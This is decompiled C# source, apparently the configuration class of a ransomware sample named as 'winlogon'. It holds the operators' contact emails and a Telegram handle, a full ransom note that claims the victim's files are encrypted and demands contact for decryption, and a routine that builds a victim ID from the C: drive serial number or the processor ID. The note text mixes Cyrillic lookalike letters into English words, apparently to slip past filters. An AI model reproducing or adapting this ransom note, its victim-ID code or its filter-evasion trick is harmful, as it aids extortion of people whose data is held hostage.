using System;
using System.Management;

namespace winlogon;

internal class config
{
	public static readonly string Soldier = "mehrdad";

	public static readonly string Email_1 = "info@cloudminerapp.com";

	public static readonly string Email_2 = "3998181090@qq.com";

	public static readonly string Readme_Text = "\r\n                      \r\n               ALL YOUR VALUABLE DATA WAS ENCRYPTED!\r\n\r\nAll yоur filеs wеrе еnсrуptеd with strоng crуptо аlgоrithm АЕS-256 + RSА-2048.\r\nPlеаsе bе surе thаt yоur filеs аrе nоt brоkеn аnd уоu cаn rеstоrе thеm tоdаy.\r\n\r\nIf yоu rеаllу wаnt tо rеstоrе yоur filеs plеаsе writе us tо thе е-mаils:\r\n\r\nfaster support Write Us To The ID-Telegram :@decrypt30  (https://t.me/decrypt30  )\r\n\r\n_em1_\r\n_em2_\r\n\r\nIn subjеct linе writе уоur ID: _pcid_\r\n\r\nImpоrtаnt! Plеаsе sеnd yоur mеssаgе tо аll оf оur 3 е-mаil аddrеssеs. This is rеаllу impоrtаnt bеcаusе оf dеlivеrу prоblеms оf sоmе mаil sеrviсеs!\r\nImportant! If you haven't received a response from us within 24 hours, please try to use a different email service (Gmail, Yahoo, AOL, etc).\r\nImportant! Please check your SPAM folder each time you wait for our response! If you find our email in the SPAM folder please move it to your Inbox.\r\nImportant! We are always in touch and ready to help you as soon as possible!\r\n\r\nАttаch up tо 2 smаll еncrуptеd filеs fоr frее tеst dесryption. Plеаsе nоte thаt thе filеs yоu sеnd us shоuld nоt cоntаin аnу vаluаblе infоrmаtiоn. Wе will sеnd yоu tеst dеcrуptеd files in оur rеspоnsе fоr yоur cоnfidеnсе.\r\nOf course you will receive all the necessary instructions hоw tо dеcrуpt yоur filеs!\r\n\r\nImportant!\r\nPlеаsе nоte that we are professionals and just doing our job!\r\nPlease dо nоt wаstе thе timе аnd dо nоt trу to dесеive us - it will rеsult оnly priсе incrеаsе!\r\nWе аrе alwауs оpеnеd fоr diаlоg аnd rеаdy tо hеlp уоu.\r\nJett\r\n\r\n\r\n";

	public static readonly int Hide = 0;

	public static string GetID()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_005c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0062: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"C:\"");
		val.Get();
		if (!string.IsNullOrEmpty(((ManagementBaseObject)val)["VolumeSerialNumber"].ToString()))
		{
			return ((ManagementBaseObject)val)["VolumeSerialNumber"].ToString();
		}
		string text = string.Empty;
		ManagementObjectEnumerator enumerator = new ManagementClass("Win32_Processor").GetInstances().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.Current;
				if (text == string.Empty)
				{
					text = ((ManagementBaseObject)val2).Properties["ProcessorId"].Value.ToString();
				}
			}
			return text;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}
}
